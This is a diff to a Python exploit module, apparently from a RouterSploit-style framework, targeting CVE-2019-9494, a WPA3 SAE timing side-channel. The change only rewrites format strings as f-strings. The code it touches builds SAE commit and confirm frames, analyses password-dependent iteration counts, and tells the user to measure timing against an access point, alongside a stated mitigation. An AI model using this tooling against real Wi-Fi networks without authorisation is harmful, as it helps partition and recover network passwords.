@@ -46,7 +46,7 @@ def _parse_mac(mac_str):
 
 
 def _mac_to_str(mac_bytes):
-    return ":".join("{:02x}".format(b) for b in mac_bytes)
+    return ":".join(f"{b:02x}" for b in mac_bytes)
 
 
 def _compute_pwd_seed(mac_a, mac_b, password, counter):
@@ -187,13 +187,13 @@ class Exploit(Exploit):
             print_error("Invalid station MAC")
             return
 
-        print_info("Station MAC: {}".format(_mac_to_str(sta_mac)))
+        print_info(f"Station MAC: {_mac_to_str(sta_mac)}")
 
         scalar = os.urandom(32)
         element = os.urandom(64)
         commit_frame = _build_sae_commit_frame(ap_mac, sta_mac, _SAE_GROUP_19, scalar, element)
-        print_info("SAE Commit frame: {} bytes".format(len(commit_frame)))
-        print_info("Frame hex (first 40 bytes): {}".format(commit_frame[:40].hex()))
+        print_info(f"SAE Commit frame: {len(commit_frame)} bytes")
+        print_info(f"Frame hex (first 40 bytes): {commit_frame[:40].hex()}")
 
         print_status("Analyzing hunting-and-pecking iteration counts...")
         test_passwords = ["password", "12345678", "qwerty123", "admin2024", "iot-device"]
@@ -205,15 +205,12 @@ class Exploit(Exploit):
             analysis_results.append((pwd, iters, timing_est))
 
         headers = ("Password", "H&P Iterations", "Est. Timing (ms)")
-        rows = [(p, str(i), "{:.2f}".format(t)) for p, i, t in analysis_results]
+        rows = [(p, str(i), f"{t:.2f}") for p, i, t in analysis_results]
         print_table(headers, *rows)
 
         unique_iters = set(r[1] for r in analysis_results)
-        print_info("Unique iteration counts: {}".format(len(unique_iters)))
-        print_info("Iteration range: {}-{}".format(
-            min(r[1] for r in analysis_results),
-            max(r[1] for r in analysis_results),
-        ))
+        print_info(f"Unique iteration counts: {len(unique_iters)}")
+        print_info(f"Iteration range: {min(r[1] for r in analysis_results)}-{max(r[1] for r in analysis_results)}")
 
         print_info("Side-channel analysis:")
         print_info("  1. Iteration count varies per password + MAC pair")
@@ -223,11 +220,11 @@ class Exploit(Exploit):
 
         confirm_val = os.urandom(32)
         confirm_frame = _build_sae_confirm_frame(ap_mac, sta_mac, confirm_val)
-        print_info("SAE Confirm frame: {} bytes".format(len(confirm_frame)))
+        print_info(f"SAE Confirm frame: {len(confirm_frame)} bytes")
 
         print_warning("CVE-2019-9494: timing side-channel in SAE enables password partitioning")
         print_info("Mitigation: use constant-time hash-to-curve (hash-to-element method)")
         print_info(
-            "To execute: use '{}' on channel {} to measure commit response "
-            "timing across multiple association attempts".format(self.interface, self.channel)
+            f"To execute: use '{self.interface}' on channel {self.channel} to measure commit response "
+            "timing across multiple association attempts"
         )
